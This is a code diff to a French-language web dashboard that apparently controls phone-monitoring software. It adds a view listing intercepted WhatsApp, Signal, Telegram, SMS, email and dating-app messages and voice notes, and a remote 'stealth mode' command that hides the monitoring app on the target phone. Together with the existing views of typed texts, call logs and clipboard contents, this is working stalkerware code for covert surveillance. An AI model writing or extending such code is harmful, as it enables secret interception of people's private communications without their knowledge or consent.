@@ -1154,11 +1154,59 @@ function renderMessagesPage(){
   const df=document.getElementById('messages-device-filter').value;
   let evts=[...allEvents];
   if(df)evts=evts.filter(e=>e.deviceId===df);
+  renderMessagesList(evts);
   renderConversations(evts);
   renderTypedTexts(evts);
   renderCallLog(evts);
   renderAppUsage(evts);
   renderClipboardLog(evts);
+}
+
+// --- Liste des MESSAGES (WhatsApp, SMS, Telegram, etc.) ---
+function renderMessagesList(evts){
+  const messageTypes=['notification_message','voice_message','voice_note_captured',
+    'root_message','sms_message','message_captured','email_notification','dating_message'];
+  const msgs=evts.filter(e=>messageTypes.includes(e.type)).sort((a,b)=>new Date(b.receivedAt)-new Date(a.receivedAt));
+  const el=document.getElementById('messages-list');
+  if(!el)return;
+  if(!msgs.length){
+    el.innerHTML='<p class="empty">Aucun message capture. Activez l\'acces aux notifications sur le telephone.</p>';
+    return;
+  }
+
+  const appIcons={WhatsApp:'💬','WhatsApp Business':'💼',Telegram:'✈️',Messenger:'💬',Instagram:'📸',Signal:'🔒',SMS:'📱',Messages:'📱',Gmail:'📧',Outlook:'📧',Email:'📧'};
+  const appColors={WhatsApp:'#25d366','WhatsApp Business':'#25d366',Telegram:'#0088cc',Messenger:'#0084ff',Instagram:'#e1306c',Signal:'#3a76f0',SMS:'#3b82f6',Gmail:'#ea4335',Outlook:'#0078d4'};
+
+  el.innerHTML=msgs.slice(0,100).map(m=>{
+    const p=m.payload||{};
+    const app=p.app||readableAppName(p.packageName)||'Message';
+    const icon=appIcons[app]||'💬';
+    const color=appColors[app]||'#3b82f6';
+    const sender=p.sender||p.contact||p.number||p.address||'Inconnu';
+    const message=p.message||p.text||p.body||'';
+    const time=shortTime(m.receivedAt);
+    const isVoice=m.type==='voice_message'||m.type==='voice_note_captured'||p.isVoiceMessage;
+    const isOutgoing=!!p.isOutgoing||!!p.key_from_me;
+    
+    let msgContent=message;
+    if(isVoice)msgContent='🎤 Message vocal';
+    if(p.isMedia)msgContent='📷 Photo/Media';
+    
+    const dirIcon=isOutgoing?'↗️':'↙️';
+    const dirLabel=isOutgoing?'Envoyé':'Reçu';
+
+    return`<div class="message-item">
+      <div class="message-avatar" style="background:${color}">${icon}</div>
+      <div class="message-content">
+        <div class="message-header">
+          <span class="message-app">${esc(app)}</span>
+          <span class="message-sender">${dirIcon} ${esc(sender)}</span>
+          <span class="message-time">${time}</span>
+        </div>
+        <div class="message-text">${esc(msgContent)}</div>
+      </div>
+    </div>`;
+  }).join('');
 }
 
 // --- Conversations UNIFIEES par contact/app ---
@@ -1670,6 +1718,28 @@ function showPhotoToast(photo){
   toast.onclick=()=>{openPhotoModal(photo);toast.remove();};
   document.body.appendChild(toast);
   setTimeout(()=>{if(toast.parentNode)toast.remove();},8000);
+}
+
+// Contrôler la visibilité de l'app à distance
+async function setAppVisibility(mode){
+  if(!currentDetailDevice){alert('Sélectionnez un appareil');return;}
+  const btnShow=document.getElementById('btn-show-app');
+  const btnHide=document.getElementById('btn-hide-app');
+  try{
+    const r=await fetch(`${API}/api/commands/${currentDetailDevice}`,{
+      method:'POST',headers:authHeaders(),
+      body:JSON.stringify({type:'set_stealth_mode',payload:{mode:mode}})
+    });
+    const d=await r.json();
+    if(d.ok){
+      const msg=mode==='visible'?'👁️ App sera visible au prochain sync':'🙈 App sera masquée au prochain sync';
+      showToast('Commande envoyée',msg);
+    }else{
+      alert('Erreur : '+(d.error||'inconnue'));
+    }
+  }catch(err){
+    alert('Erreur réseau');
+  }
 }
 
 // Toast générique
